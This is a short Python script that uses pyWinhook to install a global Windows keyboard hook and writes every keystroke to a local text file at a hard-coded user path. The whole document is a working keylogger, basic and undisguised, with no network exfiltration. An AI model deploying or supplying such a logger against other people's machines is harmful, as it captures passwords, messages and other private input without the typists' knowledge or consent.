import pyWinhook, pythoncom, sys, logging
file_log= 'C:\\Users\\Aryak Deshpande\\log4.txt'

def onKeyboardEvent(event):
	print("hi")
	logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True




hm=pyWinhook.HookManager()
hm.KeyDown=onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
